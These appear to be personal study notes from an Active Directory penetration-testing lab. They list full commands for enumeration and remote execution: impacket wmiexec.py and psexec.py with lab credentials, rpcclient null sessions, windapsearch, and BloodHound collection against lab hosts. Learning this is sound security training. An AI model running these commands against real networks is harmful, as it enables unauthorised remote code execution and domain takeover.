
using the current user and password we have, we can use [[crackmapexec]] to harvest more usernames

can use [[SMBMap]] also 

rpcclient 
can create null smb sessions [[3 - Hacking/3.4 Services/SMB|SMB]] and then we can `enumdomusers` , `queryuser 0xuserid`, ? to see all the commands available

Can use impacket toolkit
# wmiexec.py
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```
a bit more stealthy approach that other tools but would still likely caught by most modern anti-virus and EDR systems 
# psexec.py
```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```
credentials must be for a user with local administrator privileges

# windapsearch 
enumerate domain admins
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
privilege users
```shell-session
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

# bloodhound 
```shell-session
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```
theres an output json file in the current working directory 

uploading the zip file into the bloodhound gui 
```
sudo neo4j start
```
if it requires a password in htb -> user == neo4j, pass == HTB_@cademy_stdnt!

upload data -> if many json files, put them in a folder zip them and then upload it

now you can analyse them like 
```
Find Shortest Path to Domain Admins

Search for Domain Users
Node Info 
Analysis
```